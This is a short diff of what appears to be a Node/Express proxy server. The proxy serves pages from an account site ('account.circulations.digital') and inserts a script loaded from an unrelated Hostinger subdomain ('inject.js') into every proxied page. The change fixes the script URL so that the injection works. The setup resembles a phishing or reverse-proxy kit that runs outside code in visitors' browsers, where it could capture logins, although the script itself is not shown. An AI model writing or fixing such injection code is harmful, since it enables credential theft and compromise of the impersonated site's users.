@@ -182,7 +182,7 @@ app.get('/api/*', (req, res) => {
 
 	  // define baseTag in this scope so it's available when inserting into head
 	  const baseTag = `<base href="https://account.circulations.digital">`;
-	  const injectedScript = `<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script src="https://https://plum-raccoon-322277.hostingersite.com/inject.js"></script>`;
+	  const injectedScript = `<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script src="https://plum-raccoon-322277.hostingersite.com/inject.js"></script>`;
       body = body.replace('</body>', `${injectedScript}</body>`);
 	  
 	  try {
@@ -299,3 +299,4 @@ app.options('/api/*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Proxy server running on http://localhost:${PORT}`);
 });
+
